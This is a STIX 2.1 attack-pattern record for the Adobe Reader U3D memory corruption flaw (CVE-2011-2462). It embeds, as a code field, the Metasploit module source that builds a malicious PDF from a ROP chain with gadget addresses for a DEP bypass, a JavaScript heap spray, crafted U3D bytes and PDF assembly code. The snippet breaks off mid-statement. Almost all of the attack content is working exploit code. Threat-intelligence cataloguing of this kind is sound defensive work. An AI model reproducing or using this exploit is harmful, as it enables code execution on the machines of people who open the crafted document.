{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5b366c66-c4a9-49b7-a4ae-1ed11513ec4c",
    "created": "2024-08-14T16:35:35.000038Z",
    "modified": "2024-08-14T16:35:35.000042Z",
    "name": "Adobe Reader U3D Memory Corruption Vulnerability",
    "description": " This module exploits a vulnerability in the U3D handling within versions 9.x through 9.4.6 and 10 through to 10.1.1 of Adobe Reader. The vulnerability is due to the use of uninitialized memory.  Arbitrary code execution is achieved by embedding specially crafted U3D data into a PDF document. A heap spray via JavaScript is used in order to ensure that the memory used by the invalid pointer issue is controlled.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/adobe_reader_u3d.rb",
            "external_id": "adobe_reader_u3d.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2462"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/advisories/apsa11-04.html"
        },
        {
            "source_name": "reference",
            "url": "http://blog.9bplus.com/analyzing-cve-2011-2462"
        },
        {
            "source_name": "reference",
            "url": "http://contagiodump.blogspot.com/2011/12/adobe-zero-day-cve-2011-2462.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe Reader U3D Memory Corruption Vulnerability',\n      'Description'    => %q{\n          This module exploits a vulnerability in the U3D handling within\n        versions 9.x through 9.4.6 and 10 through to 10.1.1 of Adobe Reader.\n        The vulnerability is due to the use of uninitialized memory.\n\n        Arbitrary code execution is achieved by embedding specially crafted U3D\n        data into a PDF document. A heap spray via JavaScript is used in order to\n        ensure that the memory used by the invalid pointer issue is controlled.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Felipe Andres Manzano',  #Original poc (@feliam)\n          'sinn3r',\n          'juan vazquez',\n          'jduck'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-2462' ],\n          [ 'OSVDB', '77529' ],\n          [ 'BID', '50922' ],\n          [ 'URL', 'http://www.adobe.com/support/security/advisories/apsa11-04.html' ],\n          [ 'URL', 'http://blog.9bplus.com/analyzing-cve-2011-2462' ],\n          [ 'URL', 'https://sites.google.com/site/felipeandresmanzano/PDFU3DExploitJS_CVE_2009_2990.py?attredirects=0'], #Original PoC\n          [ 'URL', 'http://contagiodump.blogspot.com/2011/12/adobe-zero-day-cve-2011-2462.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1000,\n          'BadChars'      => \"\\x00\",\n          'DisableNops'   => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            # Adobe Reader 9.4.0 / XP SP3\n            # Adobe Reader 9.4.5 / XP SP3\n            # Adobe Reader 9.4.6 / XP SP3\n            'Adobe Reader 9.4.0 / 9.4.5 / 9.4.6 on Win XP SP3',\n            {\n              # gadget from icucnv36:\n              # mov ecx,dword ptr [eax+3Ch]\n              # mov eax,dword ptr [ecx]\n              # call dword ptr [eax+1Ch]\n              'Ret' => 0x4a8453c3\n            }\n          ],\n        ],\n      'DisclosureDate' => '2011-12-06', #Needs to be checked\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def junk(n=1)\n    tmp = []\n    value = rand_text(4).unpack(\"L\")[0].to_i\n    n.times { tmp << value }\n    return tmp\n  end\n\n  def exploit\n    # DEP bypass; uses icucnv36.dll\n    stack_data = [\n      junk,\n      0x0c0c0c0c, # mapped at 0x0c0c0c0c # becomes edi after stackpivot\n      0x0c0c0c0c, # becomes esi\n      0x4a806f29, # pop edi / pop esi / pop ebp / ret 14h\n      0x4a8a0000, # becomes edi\n      0x4a802196, # becomes esi\n      0x4a801f90, # becomes ebp\n      0x4a806f29, # pop edi / pop esi / pop ebp / ret 14h\n      0x4a806cef, # Stackpivot! xchg eax,esp (eax=0x0c0c0c0c) / xor al, al / pop edi / pop esi / ret # padding\n      junk(4),\n      0x00000000, # becomes edi\n      0x00000002, # becomes esi\n      0x00000102, # becomes ebp\n      0x4a806f29, # pop edi / pop esi / pop ebp / ret 14h\n      junk(5),\n      0x4a80a8a6, # becomes edi\n      0x4a801f90, # becomes esi\n      0x4a849038, # becomes ebp\n      0x4a8063a5, # pop ecx / ret\n      junk(5),\n      0x4a8a0000, # becomes ecx\n      0x4a802196, # mov dword ptr [ecx],eax / ret # Stores eax (stack address)\n      0x4a801f90, # pop eax / ret\n      0x4a84903c, # becomes eax (import for CreateFileA)\n      0x4a80b692, # jmp dword ptr [eax] {kernel32!CreateFileA}\n      0x4a801064, # ret for CreateFileA # ret\n      0x00000000, # __in      LPCTSTR lpFileName\n      0x10000000, # __in      DWORD dwDesiredAccess\n      0x00000000, # __in      DWORD dwShareMode\n      0x00000000, # __in_opt  LPSECURITY_ATTRIBUTES lpSecurityAttributes\n      0x00000002, # __in      DWORD dwCreationDisposition\n      0x00000102, # __in      DWORD dwFlagsAndAttributes\n      0x00000000, # __in_opt  HANDLE hTemplateFile\n      0x4a8063a5, # pop ecx / ret\n      0x4a801064, # becomes ecx\n      0x4a842db2, # xchg eax, edi / ret\n      0x4a802ab1, # pop ebx / ret\n      0x00000008, # becomes ebx\n      0x4a80a8a6, # and dword ptr [esp+ebx*2],edi (esp+ebx*2 = 0x0c0c0ce0, edi = {Result of CreateFileA}) / jne 4a80a8ae [br=1] / cmp al,2Fh / je 4a80a8ab [br=0] / cmp al,41h / jl 4a80a8ba [br=1] / cmp al,61h / jl 4a80a8c8) [br=1] / xor al,al / ret\n      0x4a801f90, # pop eax / ret\n      0x4a849038, # becomes eax (import for CreateFileA)\n      0x4a80b692, # jmp dword ptr [eax] {kernel32!CreateFileMappingA}\n      0x4a801064, # ret for CreateFileMappingA # ret\n      0xffffffff, # __in      HANDLE hFile # mapped at 0c0c0ce0 => Stores Result of CreateFileA\n      0x00000000, # __in_opt  LPSECURITY_ATTRIBUTES lpAttributes,\n      0x00000040, # __in      DWORD flProtect,\n      0x00000000, # __in      DWORD dwMaximumSizeHigh,\n      0x00010000, # __in      DWORD dwMaximumSizeLow,\n      0x00000000, # __in_opt  LPCTSTR lpName\n      0x4a8063a5, # pop ecx / ret\n      0x4a801064, # becomes ecx\n      0x4a842db2, # xchg eax, edi / ret\n      0x4a802ab1, # pop ebx / ret\n      0x00000008, # becomes ebx\n      0x4a80a8a6, # and dword ptr [esp+ebx*2],edi (esp+ebx*2 = 0x0c0c0d20, edi = {Result of FileMappingA}) / jne 4a80a8ae [br=1] / cmp al,2Fh / je 4a80a8ab [br=0] / cmp al,41h / jl 4a80a8ba [br=1] / cmp al,61h / jl 4a80a8c8) [br=1] / xor al,al / ret\n      0x4a801f90, # pop eax / ret\n      0x4a849030, # becomes eax (import for kernel32!MapViewOfFile)\n      0x4a80b692, # jmp dword ptr [eax] {kernel32!MapViewOfFile}\n      0x4a801064, # ret for MapViewOfFile # ret\n      0xffffffff, # __in  HANDLE hFileMappingObject # mapped at 0x0c0c0d20 => {Result of FileMappingA}\n      0x00000022, # __in  DWORD dwDesiredAccess\n      0x00000000, # __in  DWORD dwFileOffsetHigh\n      0x00000000, # __in  DWORD dwFileOffsetLow\n      0x00010000, # __in  SIZE_T dwNumberOfBytesToMap\n      0x4a8063a5, # pop ecx / ret\n      0x4a8a0004, # becomes ecx\n      0x4a802196, # mov dword ptr [ecx],eax / ret # Stores result of MapViewOfFile\n      0x4a8063a5, # pop ecx / ret\n      0x4a801064, # becomes ecx\n      0x4a842db2, # xchg eax, edi / ret\n      0x4a802ab1, # pop ebx / ret\n      0x00000030, # becomes ebx\n      0x4a80a8a6, # and dword ptr [esp+ebx*2],edi (esp+ebx*2 = 0c0c0db8, edi = {Result of MapViewOfFile} / jne 4a80a8ae [br=1] / cmp al,2Fh / je 4a80a8ab [br=0] / cmp al,41h / jl 4a80a8ba [br=1] / cmp al,61h / jl 4a80a8c8) [br=1] / xor al,al / ret\n      0x4a801f90, # pop eax / ret\n      0x4a8a0004, # becomes eax {Result of MapViewOfFile}\n      0x4a80a7d8, # mov eax,dword ptr [eax] / ret\n      0x4a8063a5, # pop ecx / ret\n      0x4a801064, # becomes ecx\n      0x4a842db2, # xchg eax, edi / ret\n      0x4a802ab1, # pop ebx / ret\n      0x00000020, # becomes ebx\n      0x4a80a8a6, # and dword ptr [esp+ebx*2],edi (esp+ebx*2 = 0c0c0dbc, edi = {Result of MapViewOfFile} / jne 4a80a8ae [br=1] / cmp al,2Fh / je 4a80a8ab [br=0] / cmp al,41h / jl 4a80a8ba [br=1] / cmp al,61h / jl 4a80a8c8) [br=1] / xor al,al / ret\n      0x4a8063a5, # pop ecx / ret\n      0x4a801064, # becomes ecx\n      0x4a80aedc, # lea edx,[esp+0Ch] (edx => 0c0c0d94) / push edx {0c0c0d94} / push eax {Result of MapViewOfFile} / push dword ptr [esp+0Ch] ([0c0c0d8c] => 0x34) / push dword ptr [4a8a093c] ([4a8a093c] = 0x0) / call ecx (u 0x4a801064 => ret) / add esp, 10h / ret\n      0x4a801f90, # pop eax / ret\n      0x00000034, # becomes eax # mapped at 0c0c0d8c\n      0x4a80d585, # add eax, edx / ret (eax => 0c0c0dc8 => shellcode after ROP chain)\n      0x4a8063a5, # pop ecx / ret # mapped at 0c0c0d94\n      0x4a801064, # becomes ecx\n      0x4a842db2, # xchg eax,edi (edi becomes 0c0c0d8c, eax becomes Result of MapViewOfFile) / ret\n      0x4a802ab1, # pop ebx / ret\n      0x0000000a, # becomes ebx\n      0x4a80a8a6, # and dword ptr [esp+ebx*2],edi (esp+ebx*2 = 0c0c0dc0, edi = {shellcode after ROP chain} / jne 4a80a8ae [br=1] / cmp al,2Fh / je 4a80a8ab [br=0] / cmp al,41h / jl 4a80a8ba [br=1] / cmp al,61h / jl 4a80a8c8) [br=1] / xor al,al / ret\n      0x4a801f90, # pop eax / ret\n      0x4a849170, # becomes eax (import for MSVCR80!memcpy)\n      0x4a80b692, # jmp dword ptr [eax] {MSVCR80!memcpy}\n      0xffffffff, # ret for memcpy # mapped at 0c0c0db8 => Result of MapViewOfFile\n      0xffffffff, # dst (memcpy param) # mapped at 0c0c0dbc => Result of MapViewOfFile\n      0xffffffff, # src (memcpy param) # mapped at 0c0c0dc0 => Address of shellcode after ROP chain\n      0x00001000  # length (memcpy param)\n    ].flatten.pack('V*')\n\n    payload_buf = ''\n    payload_buf << stack_data\n    payload_buf << payload.encoded\n    escaped_payload = Rex::Text.to_unescape(payload_buf)\n\n    eip_ptr =\n    [\n      junk(3),\n      target.ret, # EIP\n      junk(7),\n      0x0c0c0c0c, # [eax+3Ch] => becomes ecx / [0x0c0c0c0c] = 0x0c0c0c0c / [0x0c0c0c0c+1Ch] = 4a806cef => stackpivot\n      junk(16),\n    ].flatten.pack('V*')\n\n    escaped_eip = Rex::Text.to_unescape(eip_ptr)\n\n    js = <<-JS\n\n    var padding;\n    var bbb, ccc, ddd, eee, fff, ggg, hhh;\n    var pointers_a, i;\n    var x = new Array();\n    var y = new Array();\n\n    function alloc(bytes) {\n      return padding.substr(0, (bytes - 6) / 2);\n    }\n\n    function spray_eip(esc_a) {\n      pointers_a = unescape(esc_a);\n      for (i = 0; i < 2000; i++) {\n        x[i] = alloc(0x8) + pointers_a;\n        y[i] = alloc(0x88) + pointers_a;\n        y[i] = alloc(0x88) + pointers_a;\n        y[i] = alloc(0x88) + pointers_a;\n      }\n    };\n\n    function spray_shellcode() {\n      bbb = unescape('#{escaped_payload}');\n      ccc = unescape(\"%u0c0c\");\n      ccc += ccc;\n\n      while (ccc.length + 20 + 8 < (0x8000 + 0x8000)) ccc += ccc;\n\n      i1 = 0x0c0c - 0x24;\n      ddd = ccc.substring(0, i1 / 2);\n\n      ddd += bbb;\n      ddd += ccc;\n\n      i2 = 0x4000 + 0xc000;\n      eee = ddd.substring(0, i2 / 2);\n\n      for (; eee.length < 0x40000 + 0x40000;) eee += eee;\n\n      i3 = (0x1020 - 0x08) / 2;\n      fff = eee.substring(0, 0x80000 - i3);\n\n      ggg = new Array();\n\n      for (hhh = 0; hhh < 0x1e0 + 0x10; hhh++) ggg[hhh] = fff + \"s\";\n    }\n\n    padding = unescape(\"#{escaped_eip}\");\n    while (padding.length < 0x10000)\n    padding = padding + padding;\n\n    spray_shellcode();\n    spray_eip('%u4141');\n\n    this.pageNum = 2;\n    JS\n\n    js = js.gsub(/^ {4}/,'')\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate\n    end\n\n    u3d = make_u3d_stream\n    xml = make_xml_data\n    pdf = make_pdf(u3d, xml, js.to_s)\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n    file_create(pdf)\n  end\n\n  def make_xml_data\n    xml = %Q|<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <xdp:xdp xmlns:xdp=\"http://ns.adobe.com/xdp/\">\n    <ed>kapa</ed>\n    <config xmclns=\"http://www.microsoft.org/schema/xci/2.6/\">\n    <present>\n    <pdf>\n    <version>1</version>\n    <fjdklsajfodpsajfopjdsio>f</fjdklsajfodpsajfopjdsio>\n    <interactive>1</interactive>\n    </pdf>\n    </present>\n    </config>\n    <template xmdfaflns=\"http://www.microsoft.org/schema/xffdsa-template/2f/\">\n    <subform name=\"form1\" layout=\"tb\" locale=\"en_US\">\n    <pageSet>\n    </pageSet>\n    </subform>\n    </template>\n    <template1 xmdfaflns=\"http://www.microsoft.org/schema/xffdsa-template/2f/\">\n    <subform name=\"form1\" layout=\"tb\" locale=\"en_US\">\n    <pageSet>\n    </pageSet>\n    </subform>\n    </template1>\n    <template2 xmdfaflns=\"http://www.microsoft.org/schema/xffdsa-template/2f/\">\n    <subform name=\"form1\" layout=\"tb\" locale=\"en_US\">\n    <pageSet>\n    </pageSet>\n    </subform>\n    </template2>\n    </xdp:xdp>|\n\n    xml = xml.gsub(/^ {4}/, '')\n    return xml\n  end\n\n  def u3d_pad(str, char=\"\\x00\")\n    len = str.length % 4\n    if (len > 0)\n      #puts \"Adding %d pad bytes\" % (4 - len)\n      return (char * (4 - len))\n    end\n    \"\"\n  end\n\n  def u3d_string(str)\n    ([str.length].pack('v') + str)\n  end\n\n  def make_u3d_stream()\n    #\n    # REFERENCE:\n    # http://www.ecma-international.org/publications/files/ECMA-ST/ECMA-363%201st%20edition.pdf\n    # The File format consists of these blocks:\n    # [File Header Block][Declaration Block][Continuation Block]\n    # Each block consists of (padding is used to keep fields 32-bit aligned):\n    # [Block Type][Data Size][Metadata Size][Data][Data Padding][Meta Data][Meta Data Padding]\n    #\n    mc_name = u3d_string(\"CCCCBox01\")\n    mr_name = u3d_string(\"Box01RX\")\n\n    # build the U3D header (length will be patched in later)\n    hdr_data = [0,0].pack('n*') # version info\n    hdr_data << [0,0x24,0xa34,0,0x6a].pack('VVVVV') # 31337 was 0xa34\n\n    hdr = \"U3D\\x00\"\n    hdr << [hdr_data.length,0].pack('VV')\n    hdr << hdr_data\n\n    parent_node_data =\n      \"\\x01\\x00\\x00\\x00\"+ # node count (1)\n      \"\\x00\\x00\"+         # name (empty)\n      # transform matrix\n      [0x813f,0,0,0,0,0x813f,0,0,0,0,0x813f,0,0x548a55c0,0xa2027cc2,0,0x813f].pack('N*')\n\n\n    model_node_data = \"\"\n    model_node_data << mc_name\n    model_node_data << parent_node_data\n    model_node_data << mr_name\n    model_node_data << [1].pack('V') # Model Visibility (Front visible)\n    model_node = [0xffffff22,model_node_data.length,0].pack('VVV')\n    #model_node = [0xffffff22,0x5e,0].pack('VVV')\n    model_node << model_node_data\n\n    bone_weight_data = \"\"\n    bone_weight_data << mc_name\n    bone_weight_data << [\n      1,          # Chain index\n      1,          # Bone Weight Attributes (for a mesh)\n      0x3162123b, # Inverse Quant\n      0x14,       # Position Count\n    ].pack('VVNV')\n    # Position List\n    bone_weight_data << [\n      # 1\n      1,          # Bone Weight Count\n      3,          # Bone Index (no Quantized Weight)\n      # 2\n      0x55550000, # Bone Weight Count\n      0x4c1df36e, # Bone Index\n      0x0200d002, # Quantized Weight\n      # 3\n      0x95000074, # Bone Weight Count\n      0x66ccc357, # Bone Index\n      0x00000000  # Quantized Weight\n    ].pack('VVNNNNNN')\n    bone_weight = [0xffffff44,0x3a,0].pack('VVV')\n    # We hardcode the length to match the old file.. (TODO: test if necessary)\n    #bone_weight = [0xffffff44,bone_weight_data.length,0].pack('VVV')\n    bone_weight << bone_weight_data\n\n    new_objtype1_data =\n      \"\\x05\\x00\\x52\\x52\\x52\\x52\\x52\\x01\\x00\\x00\\x00\\xa6\\x04\\xa8\\x96\\xb9\\x3f\\xc5\\x43\\xb2\\xdf\\x2a\"+\n      \"\\x31\\xb5\\x56\\x93\\x40\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x52\\x52\\x52\\x52\\x52\\x01\\x00\"+\n      \"\\x00\\x00\\x01\\x00\\x2e\\x01\\x00\\x76\\x00\\x00\\x00\\x00\"\n    #new_objtype1 = [0xffffff16,0x38,0].pack('VVV')\n    new_objtype1 = [0xffffff16,new_objtype1_data.length,0].pack('VVV')\n    new_objtype1 << new_objtype1_data\n\n    shading_modifier_data = \"\"\n    shading_modifier_data << mc_name\n    shading_modifier_data <<\n      \"\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\"+\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x42\\x6f\\x02\\x00\\x00\\x00\"\n    #shading_modifier = [0xffffff45,0x23,0].pack('VVV')\n    shading_modifier = [0xffffff45,shading_modifier_data.length,0].pack('VVV')\n    shading_modifier << shading_modifier_data\n\n    new_objtype2_data =\n      \"\\x01\\x00\\x52\\x01\\x00\\x00\\x00\\xa6\\x04\\xa8\\x96\\xb9\\x3f\\xc5\\x43\\xb2\"+\n      \"\\xdf\\x2a\\x31\\xb5\\x56\\x93\\x40\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x52\\x01\\x00\\x00\\x00\"+\n      \"\\x01\\x00\\x2e\\x01\\x00\\x76\\x00\\x00\\x00\\x00\"\n    #new_objtype2 = [0xffffff16,0x30,0].pack('VVV')\n    new_objtype2 = [0xffffff16,new_objtype2_data.length,0].pack('VVV')\n    new_objtype2 << new_objtype2_data\n\n    nodemod_decl = \"\"\n    nodemod_decl << model_node\n    nodemod_decl << u3d_pad(nodemod_decl)\n    nodemod_decl << bone_weight\n    nodemod_decl << u3d_pad(nodemod_decl)\n    nodemod_decl << new_objtype1\n    nodemod_decl << u3d_pad(nodemod_decl)\n    nodemod_decl << shading_modifier\n    nodemod_decl << u3d_pad(nodemod_decl)\n    nodemod_decl << new_objtype2\n    nodemod_decl << u3d_pad(nodemod_decl)\n\n    nodemod_decl <<\n    # another modifier chain?\n    \"\\x14\\xff\\xff\\xff\\xc0\\x01\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x07\\x00\\x42\\x6f\\x78\\x30\\x31\\x52\\x58\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\"+\n    \"\\x00\\x00\"+\n    # clod mesh generator (declaration)\n    \"\\x31\\xff\\xff\\xff\\x9b\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x42\\x6f\\x78\\x30\\x31\\x52\"+\n    \"\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x24\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x6c\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x2c\\x01\\x00\\x00\\x2c\\x01\\x00\\x00\\x2c\"+\n    \"\\x01\\x00\\x00\\x87\\x52\\x0a\\x3d\\xa6\\x05\\x6f\\x3b\\xa6\\x05\\x6f\\x3b\\x4a\\xf5\\x2d\\x3c\\x4a\\xf5\\x2d\"+\n    \"\\x3c\\x66\\x66\\x66\\x3f\\x00\\x00\\x00\\x3f\\xf6\\x28\\x7c\\x3f\\x04\\x00\\x00\\x00\\x07\\x00\\x53\\x63\\x61\"+\n    \"\\x70\\x75\\x6c\\x61\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x07\\x00\\x48\\x75\\x6d\\x65\\x72\\x75\\x73\\x07\\x00\\x53\\x63\\x61\\x70\\x75\\x6c\\x61\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x55\\x6c\\x6e\\x61\\x07\\x00\\x48\\x75\"+\n    \"\\x6d\\x65\\x72\\x75\\x73\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x41\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x41\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\"+\n    \"\\x00\\x52\\x61\\x64\\x69\\x75\\x73\\x04\\x00\\x55\\x6c\\x6e\\x61\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x41\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x70\\x41\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    # clod mesh generator (progressive mesh cont)\n    \"\\x3c\\xff\\xff\\xff\\x6f\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\"+\n    \"\\x42\\x6f\\x78\\x30\\x31\\x52\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x94\\x00\\x00\\x00\\x50\\x02\\x00\\x00\\x28\\x01\"+\n    \"\\x00\\x00\\x7f\\x75\\x2f\\x2b\\x00\\x00\\x20\\x73\\x00\\x00\\xc3\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x02\"+\n    \"\\x45\\xe4\\x4c\\x55\\x01\\x00\\x00\\xe0\\x30\\x03\\x00\\x00\\xb0\\x01\\x00\\x00\\x00\\x36\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x55\\x55\\x05\\x00\\x80\\xa3\\x2a\\x00\\xc0\\xe1\"+\n    \"\\x41\\x6b\\x92\\xf2\\xa4\\x00\\x00\\x72\\x87\\x18\\x4c\\xd0\\xda\\x00\\x00\\x20\\x46\\xa9\\x03\\x00\\x40\\x8c\"+\n    \"\\x00\\x00\\xa0\\x7c\\xa9\\xa7\\x10\\x03\\x00\\x00\\xc4\\x09\\x00\\x00\\x0d\\xd2\\x50\\x85\\x03\\x72\\x00\\x80\"+\n    \"\\x5c\\x37\\x19\\xc1\\xb9\\x0f\\x00\\x20\\x55\\xf7\\x13\\x00\\x40\\x00\\xdc\\x1f\\xf9\\x2c\\x35\\x30\\x6e\\x06\"+\n    \"\\x62\\xb6\\xea\\x09\\x2e\\x7b\\x28\\xa4\\x90\\xe0\\xb3\\x63\\x2c\\x20\\x92\\x2a\\x88\\xbc\\x06\\x3a\\xff\\x80\"+\n    \"\\x43\\xb2\\x00\\x00\\x00\\x14\\x62\\x0e\\x63\\xb4\\x04\\x08\\x47\\x52\\x20\\x31\\xca\\x00\\x00\\xb4\\x21\\xe0\"+\n    \"\\xd7\\x01\\x00\\xa0\\x1a\\x72\\x11\\x71\\xc2\\x2c\\x74\\xc1\\xa3\\x56\\xfa\\x30\\x03\\x00\\xe0\\x7b\\xd0\\x62\"+\n    \"\\x2a\\x00\\x40\\x71\\xfa\\x6c\\xc6\\xcf\\x07\\x78\\x81\\xd0\\x47\\x3d\\x58\\x0e\\x51\\x0f\\x2e\\x27\\x2d\\xbe\"+\n    \"\\x26\\x10\\x06\\x6f\\x3a\\x40\\xae\\x36\\x6a\\x43\\x60\\xdf\\xcb\\xef\\x8c\\x38\\xca\\x04\\x92\\x79\\x4b\\x79\"+\n    \"\\xe9\\x42\\xbd\\x2b\\xb9\\x5b\\x86\\x60\\x65\\xa4\\x75\\x01\\x19\\xda\\xcf\\x6a\\xf7\\x2a\\x77\\x3c\\xde\\xf1\"+\n    \"\\x11\\x75\\x33\\xd3\\x94\\x74\\x4a\\x14\\x73\\x4b\\x18\\xa1\\x66\\xc2\\x0f\\xde\\x3d\\xed\\x19\\xd4\\x32\\x2e\"+\n    \"\\xb6\\x11\\xf2\\xc6\\x2f\\x13\\x62\\xb9\\xe5\\xe1\\x03\\x8b\\xb5\\x1c\\x23\\x9f\\x80\\x03\\x75\\xb6\\x26\\xd3\"+\n    \"\\x1c\\x16\\x5f\\x9b\\x3c\\xea\\x62\\x10\\xe1\\xb1\\x00\\x00\\x00\\x00\"\n\n    # build the modifier chain\n    chain_data = \"\"\n    chain_data << mc_name\n    chain_data << [0].pack('V') # type (node modifier)\n    chain_data << [0].pack('V') # attributes (no bounding info)\n    chain_data << u3d_pad(chain_data)\n    chain_data << [0x5].pack('V') # number of modifiers\n    chain_data << nodemod_decl\n    #modifier_chain = [0xffffff14,chain_data.length,0].pack('VVV') # chain_data was 0x17c bytes\n    modifier_chain = [0xffffff14,0x17c,0].pack('VVV')\n    modifier_chain << chain_data\n\n    data = \"\"\n    data << hdr\n    data << modifier_chain\n\n    data\n  end\n\n  def random_non_ascii_string(count)\n    result = \"\"\n    count.times do\n      result << (rand(128) + 128).chr\n    end\n    result\n  end\n\n  def io_def(id)\n    \"%d 0 obj\\n\" % id\n  end\n\n  def io_ref(id)\n    \"%d 0 R\" % id\n  end\n\n  def ascii_hex_whitespace_encode(str)\n    result = \"\"\n    whitespace = \"\"\n    str.each_byte do |b|\n      result << whitespace << \"%02x\" % b\n      whitespace = \" \" * (rand(3) + 1)\n    end\n    result << \">\"\n  end\n\n  def make_pdf(u3d_stream, xml, js_doc)\n    xref = []\n    eol = \"\\x0a\"\n    obj_end = \"\" << eol << \"endobj\" << eol\n\n    # the header\n    pdf = \"%PDF-1.7\" << eol\n\n    # filename/comment\n    pdf << \"%\" << random_non_ascii_string(4) << eol\n\n    email = rand_text_alpha(3) + \"@\" + rand_text_alpha(4) + \".com\"\n    site  = rand_text_alpha(5) + \".com\"\n    xref << pdf.length\n    pdf << io_def(1)\n    pdf << \"<</Author (Fo)/email (#{email})/web (site)>>\"\n    pdf << obj_end\n\n    compressed_xml = Zlib::Deflate.deflate(xml)\n    xref << pdf.length\n    pdf << io_def(2)\n    pdf << \"<</Length \" << compressed_xml.length.to_s << \" /Filter /FlateDecode>>\" << eol\n    pdf << \"stream\" << eol\n    pdf << compressed_xml << eol\n    pdf << \"endstream\"\n    pdf << obj_end\n\n    xref << pdf.length\n    pdf << io_def(3)\n    pdf << \"<</XFA \" << io_ref(2) << \">>\"\n    pdf << obj_end\n\n    xref << pdf.length\n    pdf << io_def(4)\n    pdf << \"<</Type/Catalog/Outlines \" << io_ref(5)\n    pdf << \" /Pages \" << io_ref(6)\n    pdf << \" /OpenAction \" << io_ref(14)\n    pdf << \" /AcroForm \" << io_ref(3)\n    pdf << \">>\"\n    pdf << obj_end\n\n    xref << pdf.length\n    pdf << io_def(5) << \"<</Type/Outlines/Count 0>>\"\n    pdf << obj_end\n\n    xref << pdf.length\n    pdf << io_def(6)\n    pdf << \"<</Type/Pages/Count 3/Kids [%s %s %s]>>\" % [io_ref(13), io_ref(9), io_ref(12)]\n    pdf << obj_end\n\n    data = 